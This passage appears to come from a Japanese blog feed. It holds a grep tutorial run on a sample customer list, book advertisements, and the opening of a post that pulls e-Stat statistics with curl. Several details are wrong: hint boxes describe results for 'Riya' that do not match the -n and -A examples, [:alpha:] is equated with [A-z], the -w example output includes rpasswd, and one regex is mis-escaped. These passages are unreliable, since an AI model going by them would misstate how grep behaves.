56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/code>&lt;/pre>&lt;p>次の「grep」コマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。&lt;/p>
&lt;pre>
$ cat Customers.txt | grep 'Ma'
56 &lt;font color=red>Ma&lt;/font>liha Chowdhury maliha@gmail.com +8801820001980
79 &lt;font color=red>Ma&lt;/font>ruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;p>次の「grep」コマンドは、「Ma」という単語を含むテキストファイルの行を「正確」に検索します。&lt;br>
ファイルのいずれかの行に「Ma」という単語が正確に含まれている場合、その行が出力されます。&lt;br>
「Ma」という単語がないため、出力されません。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat Customers.txt | grep -w 'Ma'
$
&lt;/code>&lt;/pre>&lt;p>次の「grep」コマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。&lt;br>
ファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。&lt;/p>
&lt;pre>
$ cat Customers.txt | grep -w 'Maliha'
56 &lt;font color=red>Maliha&lt;/font> Chowdhury maliha@gmail.com +8801820001980
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>&amp;lsquo;-w&amp;rsquo; オプションと検索語「Ma」を指定した「grep」コマンドは、テキストファイルに「Ma」という単語が含まれていないため、何も返しませんでした。&lt;/dd>
&lt;dd>-wオプションと検索語「Maliha」を指定した「grep」コマンドは、「Maliha」という単語を含むファイルの5行目を返しました。&lt;/dd>
&lt;dd>&amp;lsquo;-w&amp;rsquo; オプションは正確な単語を検索対象とするオプションです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="現在のディレクトリで複数のファイルを検索する">現在のディレクトリで複数のファイルを検索する&lt;/h2>
&lt;p>「grep」コマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。&lt;br>
* ワイルドカードを使用して現在のディレクトリ内の複数のファイルを検索する方法は、Customers.txtファイルのこの例に示されています。&lt;/p>
&lt;p>次の「grep」コマンドは、「split」という単語を含む現在のディレクトリのファイルを再帰的に検索します。&lt;br>
&amp;lsquo;split&amp;rsquo;という単語を含む現在のディレクトリとサブディレクトリのファイルは、次の行で出力されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ grep -w split *
$
&lt;/code>&lt;/pre>&lt;h2 id="ディレクトリを再帰的に検索する">ディレクトリを再帰的に検索する&lt;/h2>
&lt;p>&amp;lsquo;-r&amp;rsquo; オプションは、「grep」コマンドとともに使用して、ディレクトリ内の特定の文字列またはパターンを再帰的に検索します。&lt;br>
この例では、「grep」コマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ grep -wr split *
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ディレクトリを指定して再帰的に検索したい場合は、&lt;br>
$ grep 検索文字列 検索したい場所&lt;/dd>
&lt;dd>となります。&lt;/dd>
&lt;/dl>
&lt;pre>
$ grep -wr kpasswd /etc/services
&lt;font color=red>kpasswd&lt;/font> 464/udp # kpasswd
&lt;font color=red>kpasswd&lt;/font> 464/tcp # kpasswd
&lt;font color=red>rpasswd&lt;/font> 774/tcp #
$
&lt;/pre>
&lt;/div>
&lt;h2 id="行番号を出力に追加します">行番号を出力に追加します&lt;/h2>
&lt;p>「grep」コマンドの &amp;lsquo;-n&amp;rsquo; オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。&lt;br>
この例では、'-n&amp;rsquo; オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -n "Ali"
4:45 Minhaz &lt;font color=red>Ali&lt;/font> ali@gmail.com +8801190761212
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="一致する行の後に特定の行数を印刷します">一致する行の後に特定の行数を印刷します&lt;/h2>
&lt;p>数値を含む &amp;lsquo;-A&amp;rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。&lt;br>
この例では、Customers.txtファイルに対して「grep」コマンドの &amp;lsquo;-A&amp;rsquo; オプションを使用しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -A2 "Ali"
45 Minhaz &lt;font color=red>Ali&lt;/font> ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ターミナルから前のコマンドを実行すると、次の出力が表示されます。文字列「Riya」はファイルの3行目にあります。4行目と5行目は、一致する行の次の2行です。したがって、3行目、4行目、および5行目は、一致する文字列を強調表示することによって出力に出力されています。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="一致する行の前に特定の行数を印刷します">一致する行の前に特定の行数を印刷します&lt;/h2>
&lt;p>数値を含む &amp;lsquo;-B&amp;rsquo; オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。&lt;br>
この例では、Customers.txtファイルに対して「grep」コマンドの &amp;lsquo;-B&amp;rsquo; オプションの使用法を示しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -B1 "Riya"
11 Md. Abir abir@gmail.com +8801813462458
23 &lt;font color=red>Riya&lt;/font> Chakroborti riya@gmail.com +8801937864534
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>文字列「Riya」はファイルの3行目にあります。2行目は、一致する行の前の行です。したがって、2行目と3行目は、一致する文字列を強調表示することによって出力に出力されています。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="一致する行の前後の特定の行数を印刷します">一致する行の前後の特定の行数を印刷します&lt;/h2>
&lt;p>数値を指定した &amp;lsquo;-C&amp;rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。&lt;br>
この例では、 Customers.txtファイルの「grep」コマンドの &amp;lsquo;-C&amp;rsquo; オプションの使用法を示しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -C1 "Maliha"
45 Minhaz Ali ali@gmail.com +8801190761212
56 &lt;font color=red>Maliha&lt;/font> Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 &amp;lsquo;Maliha&amp;rsquo;が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="ブラケットを使用して特定の数字を一致させる">ブラケットを使用して特定の数字を一致させる[]&lt;/h2>
&lt;p>特定の桁の範囲は、角かっこ[]を使用して、「grep」コマンドの正規表現パターンで定義できます。&lt;br>
この例では、Customers.txtファイルの「grep」コマンドを使用して特定の数字を検索する方法を示します。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$ cat Customers.txt | grep '[3-5]'
$
11 Md. Abir abir@gmail.com +880181&lt;font color=red>34&lt;/font>62&lt;font color=red>45&lt;/font>8
2&lt;font color=red>3&lt;/font> Riya Chakroborti riya@gmail.com +88019&lt;font color=red>3&lt;/font>786&lt;font color=red>4534&lt;/font>
&lt;font color=red>45&lt;/font> Minhaz Ali ali@gmail.com +8801190761212
&lt;font color=red>5&lt;/font>6 Maliha Chowdhury maliha@gmail.com +8801820001980
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>[3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。&lt;/dd>
&lt;dd>2,3,4,5,6 としたい場合は、 [2-6]となります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="3番目のブラケットを使用してパターンを特定の文字と一致させる">3番目のブラケットを使用してパターンを特定の文字と一致させる[]&lt;/h2>
&lt;p>ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。&lt;br>
角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。&lt;br>
この例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep 'Ma[lr]'
56 &lt;font color=red>Mal&lt;/font>iha Chowdhury maliha@gmail.com +8801820001980
79 &lt;font color=red>Mar&lt;/font>uf Sarkar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>Ma から始まる単語を検索し、さらに続く文字列が &amp;lsquo;[lr]&amp;rsquo; すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="alnumクラスを使用してアルファベットと数字を一致させる">[：alnum：]クラスを使用してアルファベットと数字を一致させる&lt;/h2>
&lt;p>[:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。&lt;br>
パターン[A-z0-9]に相当します。&lt;/p>
&lt;h2 id="alphaクラスを使用してアルファベット文字を照合する">[：alpha：]クラスを使用してアルファベット文字を照合する&lt;/h2>
&lt;p>[:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。&lt;br>
パターン[A-z]に相当します。&lt;/p>
&lt;h2 id="digitクラスを使用して数字を照合する">[：digit：]クラスを使用して数字を照合する&lt;/h2>
&lt;p>[:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。&lt;br>
パターン[0-9]と同等です。&lt;/p>
&lt;h2 id="lowerクラスを使用して小文字を照合する">[：lower：]クラスを使用して小文字を照合する&lt;/h2>
&lt;p>[:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。&lt;br>
パターン[a-z]と同等です。&lt;/p>
&lt;h2 id="spaceクラスを使用してスペース文字を一致させる">[：space：]クラスを使用してスペース文字を一致させる&lt;/h2>
&lt;p>[:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>tab文字、空白も含めて検索対象となります。&lt;/dd>
&lt;dd>$ grep &amp;ldquo;test(タブ文字)&amp;rdquo; /path/to/file&lt;br>
:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。&lt;/dd>
&lt;dd>
&lt;p>&amp;lsquo;[[:space:]]&amp;rsquo; では空白文字もタブ文字もマッチする。&lt;/p>
&lt;/dd>
&lt;dd>これならメモなどからコピペできる。&lt;br>
$ grep &amp;ldquo;test[[:space:]]&amp;rdquo; /path/to/file&lt;/dd>
&lt;dd>
&lt;p>また、&lt;br>
$ grep test$'\t&amp;rsquo; /path/to/file&lt;br>
であればタブだけがマッチする。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="行頭からの検索">行頭からの検索&lt;/h2>
&lt;p>キャレット（^）記号は、ファイル内の特定の文字または文字列で始まる行と一致するように正規表現で使用されます。&lt;br>
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep ^4
&lt;font color=red>4&lt;/font>5 Minhaz Ali ali@gmail.com +8801190761212
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ターミナルから前のコマンドを実行すると、次の出力が表示されます。出力によると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="行の終わりに一致する">行の終わりに一致する&lt;/h2>
&lt;p>ドル（$）記号は、ファイル内の特定の文字または文字列と行末を一致させるために正規表現で使用されます。&lt;br>
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep 1212$
45 Minhaz Ali ali@gmail.com +8801190761212
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>customers.txtファイルには「1212」で終わる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="連結との一致">連結との一致&lt;/h2>
&lt;p>正規表現パターンは、複数のパターンを連結することで作成できます。&lt;br>
ドット（.）は、パターンを連結するために使用されます。&lt;br>
この例では、 Customers.txtファイルに対して「grep」コマンドと連結して使用する方法を示しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -e '[MR]\.\*[Kk]'
23 &lt;font color=red>Riya Chak&lt;/font>roborti riya@gmail.com +8801937864534
79 &lt;font color=red>Maruf Sark&lt;/font>ar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>customers.txtファイルには「R」と「M 」で始まり「 k 」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>e-Stat でGoogle Custom Search APIを使おう（４）</title><link>https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/</link><pubDate>Fri, 21 Jan 2022 13:50:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/anal.jpg" alt="Featured image of post e-Stat でGoogle Custom Search APIを使おう（４）" />&lt;h2 id="google-custom-search-apiの検索結果と統計名の列名をマッチンングさせる">Google Custom Search APIの検索結果と統計名の列名をマッチンングさせる&lt;/h2>
&lt;p>今回は、前回取得したGoogle Custom Search APIの検索結果と統計名の列名をマッチンングさせて社会的に関心の高い列名を取得してみたいと思います。&lt;/p>
&lt;p>今回は「人権侵犯事件統計」 を取り扱ってみたいと思います。&lt;br>
人権侵犯事件統は、法務省の人権擁護機関で取り扱った人権侵犯事件及び人権相談に関する統計報告を集計したものとのことです。&lt;/p>
&lt;h2 id="e-stat-から統計データを取得する">e-Stat から統計データを取得する&lt;/h2>
&lt;p>まずはe-StatのAPIにアクセスして統計データを取得します。&lt;br>
将来的には新着の統計データを日時で取得して処理するようにしますが、今回は「人権侵犯事件統計」だけ取得します。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -s &amp;quot;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003286680&amp;amp;metaGetFlg=Y&amp;amp;cntGetFlg=N&amp;amp;explanationGetFlg=Y&amp;amp;annotationGetFlg=Y&amp;amp;sectionHeaderFlg=1&amp;amp;replaceSpChars=0&amp;quot; -o &amp;quot;$STCSV&amp;quot;
&lt;/code>&lt;/pre>&lt;h2 id="統計データの中身を見てみる">統計データの中身を見てみる&lt;/h2>
&lt;pre tabindex="0">&lt;code>&amp;quot;RESULT&amp;quot;
&amp;quot;STATUS&amp;quot;,&amp;quot;0&amp;quot;
&amp;quot;ERROR_MSG&amp;quot;,&amp;quot;正常に終了しました。&amp;quot;
&amp;quot;DATE&amp;quot;,&amp;quot;2022-01-21T09:58:51.856+09:00&amp;quot;
&amp;quot;RESULT_INF&amp;quot;
&amp;quot;TOTAL_NUMBER&amp;quot;,&amp;quot;403425&amp;quot;
&amp;quot;FROM_NUMBER&amp;quot;,&amp;quot;1&amp;quot;
&amp;quot;TO_NUMBER&amp;quot;,&amp;quot;100000&amp;quot;
&amp;quot;NEXT_KEY&amp;quot;,&amp;quot;100001&amp;quot;
&amp;quot;TABLE_INF&amp;quot;,&amp;quot;0003286680&amp;quot;
&amp;quot;STAT_NAME&amp;quot;,&amp;quot;00250010&amp;quot;,&amp;quot;人権侵犯事件統計&amp;quot;
&amp;quot;GOV_ORG&amp;quot;,&amp;quot;00250&amp;quot;,&amp;quot;法務省&amp;quot;
&amp;quot;STATISTICS_NAME&amp;quot;,&amp;quot;人権侵犯事件統計&amp;quot;
&amp;quot;TITLE&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;人権侵犯事件 種類別　人権侵犯事件の受理及び
処理件数　（月次）&amp;quot;
&amp;quot;CYCLE&amp;quot;,&amp;quot;月次&amp;quot;
&amp;quot;SURVEY_DATE&amp;quot;,&amp;quot;201801&amp;quot;
&amp;quot;OPEN_DATE&amp;quot;,&amp;quot;2022-01-20&amp;quot;
&amp;quot;SMALL_AREA&amp;quot;,&amp;quot;0&amp;quot;
&amp;quot;COLLECT_AREA&amp;quot;,&amp;quot;該当なし&amp;quot;
&amp;quot;MAIN_CATEGORY&amp;quot;,&amp;quot;14&amp;quot;,&amp;quot;司法・安全・環境&amp;quot;
&amp;quot;SUB_CATEGORY&amp;quot;,&amp;quot;01&amp;quot;,&amp;quot;司法&amp;quot;
&amp;quot;OVERALL_TOTAL_NUMBER&amp;quot;,&amp;quot;0&amp;quot;
&amp;quot;UPDATED_DATE&amp;quot;,&amp;quot;2022-01-20&amp;quot;
&amp;quot;STATISTICS_NAME_SPEC&amp;quot;,&amp;quot;人権侵犯事件統計&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;TITLE_SPEC&amp;quot;,&amp;quot;人権侵犯事件&amp;quot;,&amp;quot;種類別　人権侵犯事件の受理
及び処理件数　（月次）&amp;quot;,&amp;quot;処理の合計件数と，その内訳であ
る措置，措置猶予，侵犯事実不存在，侵犯事実不明確，打切&amp;gt;り，中止，移送及び啓発の各件数の合計とが一致しない場合&amp;gt;があるのは，１つの事件につき複数の措置を採る場合がある&amp;gt;こと等による。&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;VALUE&amp;quot;
&amp;quot;tab_code&amp;quot;,&amp;quot;表章項目&amp;quot;,&amp;quot;cat01_code&amp;quot;,&amp;quot;人権侵犯事件の受理&amp;gt;・処理別&amp;quot;,&amp;quot;cat02_code&amp;quot;,&amp;quot;人権侵犯事件の種類別&amp;quot;,&amp;quot;time_code&amp;quot;,&amp;quot;時間軸(月次)&amp;quot;,&amp;quot;unit&amp;quot;,&amp;quot;value&amp;quot;,&amp;quot;annotation&amp;quot;
&amp;quot;100&amp;quot;,&amp;quot;件数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;2021001111&amp;quot;,&amp;quot;2021年11月&amp;quot;,&amp;quot;件&amp;quot;,&amp;quot;1430&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;100&amp;quot;,&amp;quot;件数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;100&amp;quot;,&amp;quot;総数&amp;quot;,&amp;quot;2021001010&amp;quot;,&amp;quot;2021年10月&amp;quot;,&amp;quot;件&amp;quot;,&amp;quot;1329&amp;quot;,&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>データの中身を見てみると&amp;quot;VALUE&amp;quot;から上がヘッダー的な項目で、データは&amp;quot;VALUE&amp;quot;以下にありそうです。&lt;br>
VALUE より上の行を削除しましょう。&lt;br>
sed でマッチした行より上を削除する方法ががあると良いのですがわからないのでgrepと組み合わせます。&lt;/p>
&lt;p>grep -n でマッチした行数を取得できます。&lt;/p>
&lt;p>sed -e &amp;ldquo;1,26d&amp;rdquo; で1行目から26行目までを削除できます&lt;/p>
